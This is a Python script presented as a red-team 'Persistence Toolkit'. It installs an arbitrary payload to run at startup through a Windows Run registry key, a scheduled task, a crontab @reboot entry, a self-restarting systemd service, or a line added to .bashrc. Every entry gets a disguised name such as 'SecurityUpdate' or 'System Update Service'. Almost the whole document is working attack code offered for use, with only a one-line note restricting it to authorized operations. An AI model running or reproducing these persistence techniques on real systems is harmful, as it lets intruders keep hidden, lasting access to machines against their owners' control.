#!/usr/bin/env python3
"""
Persistence Toolkit - Persistence Mechanism Framework
Author: Youssef Zeidi | Red Team Specialist
For authorized red team operations only.
"""

import argparse, subprocess, os, sys, platform

def banner():
    print("""
    ╔══════════════════════════════════════╗
    ║    Persistence Toolkit v1.0          ║
    ║    Adversary Emulation Framework     ║
    ╚══════════════════════════════════════╝
    """)

def registry_persist(payload_path, key_name="SecurityUpdate"):
    """Windows Registry Run Key persistence"""
    if platform.system() != "Windows":
        print("[!] Registry persistence is Windows-only")
        return
    print(f"[*] Adding registry persistence: {key_name}")
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, payload_path)
        winreg.CloseKey(key)
        print(f"[+] Registry key added: HKCU\\...\\Run\\{key_name}")
        print(f"[+] Payload: {payload_path}")
    except Exception as e:
        print(f"[!] Registry persistence failed: {e}")

def scheduled_task(payload_path, task_name="SystemHealthCheck", trigger="logon"):
    """Windows Scheduled Task persistence"""
    if platform.system() != "Windows":
        print("[!] Scheduled tasks are Windows-only")
        return
    print(f"[*] Creating scheduled task: {task_name}")
    cmd = f'schtasks /create /tn "{task_name}" /tr "{payload_path}" /sc {trigger} /f'
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if "SUCCESS" in result.stdout:
        print(f"[+] Task created: {task_name}")
    else:
        print(f"[!] Failed: {result.stderr}")

def cron_persist(payload_path, schedule="@reboot"):
    """Linux crontab persistence"""
    if platform.system() == "Windows":
        print("[!] Cron persistence is Linux-only")
        return
    print(f"[*] Adding cron persistence...")
    cron_entry = f"{schedule} {payload_path}\n"
    cmd = f'(crontab -l 2>/dev/null; echo "{schedule} {payload_path}") | crontab -'
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    print(f"[+] Cron entry added: {schedule} {payload_path}")

def systemd_persist(payload_path, service_name="system-update"):
    """Linux systemd service persistence"""
    if platform.system() == "Windows":
        print("[!] systemd persistence is Linux-only")
        return
    print(f"[*] Creating systemd service: {service_name}")
    service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart={payload_path}
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
"""
    service_path = f"/etc/systemd/system/{service_name}.service"
    try:
        with open(service_path, "w") as f:
            f.write(service_content)
        subprocess.run(f"systemctl enable {service_name}", shell=True)
        print(f"[+] Service created: {service_path}")
        print(f"[+] Service enabled: {service_name}")
    except PermissionError:
        print("[!] Root required for systemd persistence")

def bash_profile_persist(payload_path):
    """Linux .bashrc/.profile persistence"""
    print("[*] Adding .bashrc persistence...")
    entry = f"\n# System update check\n{payload_path} &\n"
    bashrc = os.path.expanduser("~/.bashrc")
    with open(bashrc, "a") as f:
        f.write(entry)
    print(f"[+] Persistence added to {bashrc}")

def list_persistence():
    """List common persistence locations"""
    print("[*] Checking persistence mechanisms...")
    
    if platform.system() == "Windows":
        locations = [
            "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            "Scheduled Tasks",
            "Startup folder",
        ]
    else:
        locations = ["~/.bashrc", "~/.profile", "/etc/crontab", "/etc/systemd/system/"]
    
    for loc in locations:
        print(f"  [~] {loc}")

def main():
    banner()
    parser = argparse.ArgumentParser()
    parser.add_argument("--method", 
                        choices=["registry","task","cron","systemd","bashrc","list"],
                        required=True)
    parser.add_argument("--payload", help="Path to payload/script")
    parser.add_argument("--name", default="SystemUpdate", help="Key/task/service name")
    args = parser.parse_args()

    if args.method == "registry":
        registry_persist(args.payload, args.name)
    elif args.method == "task":
        scheduled_task(args.payload, args.name)
    elif args.method == "cron":
        cron_persist(args.payload)
    elif args.method == "systemd":
        systemd_persist(args.payload, args.name)
    elif args.method == "bashrc":
        bash_profile_persist(args.payload)
    elif args.method == "list":
        list_persistence()

if __name__ == "__main__":
    main()
